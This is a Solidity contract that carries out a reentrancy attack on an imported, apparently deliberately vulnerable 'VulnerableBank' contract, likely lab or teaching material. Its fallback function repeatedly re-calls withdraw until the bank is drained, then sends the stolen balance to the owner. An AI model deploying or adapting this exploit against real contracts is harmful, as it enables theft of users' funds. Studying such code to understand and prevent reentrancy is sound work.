// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public bank;
    address public owner;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
        owner = msg.sender;
    }

    // 发起攻击
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    // fallback：被调用时再次执行 withdraw
    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        } else {
            // 攻击结束后提取利润
            payable(owner).transfer(address(this).balance);
        }
    }
   
}
